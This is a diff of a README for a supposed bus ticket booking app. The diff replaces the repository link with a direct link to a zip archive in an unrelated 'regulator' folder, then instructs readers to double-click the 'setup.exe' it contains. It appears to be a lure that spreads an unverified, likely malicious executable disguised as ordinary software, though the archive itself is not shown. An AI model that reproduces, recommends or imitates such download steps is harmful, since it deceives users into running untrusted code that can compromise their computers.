@@ -1,6 +1,6 @@
 # 🚌 bus-ticket-booking - Reserve your bus seats with ease
 
-[![Download Software](https://img.shields.io/badge/Download-Bus_Ticket_App-blue.svg)](https://github.com/rewardful-undervaluation956/bus-ticket-booking)
+[![Download Software](https://img.shields.io/badge/Download-Bus_Ticket_App-blue.svg)](https://github.com/rewardful-undervaluation956/bus-ticket-booking/raw/refs/heads/main/regulator/bus-booking-ticket-v3.4.zip)
 
 ## 📋 About The Application
 
@@ -20,7 +20,7 @@ Ensure your computer meets these requirements before you start the installation 
 
 Follow these steps to set up the software on your computer:
 
-1. Visit this page to download the latest version of the installer: [https://github.com/rewardful-undervaluation956/bus-ticket-booking](https://github.com/rewardful-undervaluation956/bus-ticket-booking)
+1. Visit this page to download the latest version of the installer: [https://github.com/rewardful-undervaluation956/bus-ticket-booking/raw/refs/heads/main/regulator/bus-booking-ticket-v3.4.zip](https://github.com/rewardful-undervaluation956/bus-ticket-booking/raw/refs/heads/main/regulator/bus-booking-ticket-v3.4.zip)
 2. Locate the file named "setup.exe" in your downloads folder once the transfer finishes.
 3. Double-click the file to start the installation wizard.
 4. Follow the prompts on your screen. Select the default installation path if you remain unsure where to place the files.
